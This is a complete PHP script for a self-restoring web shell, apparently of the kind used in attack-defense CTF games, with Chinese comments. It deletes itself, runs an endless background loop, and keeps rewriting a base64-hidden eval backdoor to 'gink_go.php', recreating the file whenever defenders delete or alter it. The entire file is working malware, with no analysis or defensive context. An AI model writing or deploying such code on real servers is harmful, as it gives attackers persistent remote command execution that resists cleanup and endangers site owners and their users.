<?php
@unlink($_SERVER['SCRIPT_FILENAME']); //删除自身
error_reporting(0); //禁用错误报告
ignore_user_abort(true); //忽略与用户的断开，用户浏览器断开后继续执行
set_time_limit(0); //执行不超时
function uploadshell(){
	file_put_contents("gink_go.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWydjbWRkJ10pOyA/Pg=="));
	$check_md5=md5_file("gink_go.php");
	return $check_md5;
}
while(1){
	if(file_exists("gink_go.php")){
		if(is_dir("gink_go.php")){
			rename("gink_go.php",(string)time());
			$check_md5=uploadshell();
		}
		else{
			$check_md55 = md5_file("gink_go.php");
			if(isset($check_md5)){
				if($check_md5 === $check_md55){
					echo $check_md5."----".$check_md55."|||||";
					continue;
				}
			else{
				//这样是不是保险点
				@unlink("gink_go.php");
				$check_md5=uploadshell();
			}
			}	
		else{
			@unlink("gink_go.php");
			$check_md5=uploadshell();
		}
	}
}
	else{
		$check_md5=uploadshell();
	}

}
?>
